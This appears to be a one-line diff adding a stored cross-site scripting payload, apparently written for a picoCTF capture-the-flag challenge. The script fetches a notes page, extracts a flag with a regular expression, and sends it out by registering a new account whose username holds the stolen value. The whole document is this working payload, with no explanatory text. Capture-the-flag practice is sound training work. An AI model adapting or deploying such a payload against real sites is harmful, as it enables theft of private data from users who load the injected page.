@@ -1,0 +1,1 @@
+<script>fetch('http://0.0.0.0:8080/notes').then(r=>r.text()).then(h=>{let m=h.match(/picoCTF\{[^}]+\}/);if(m){let d=new FormData();d.append('username','gg'+m[0]);d.append('password','x');fetch('http://0.0.0.0:8080/register',{method:'POST',body:d})}})</script>
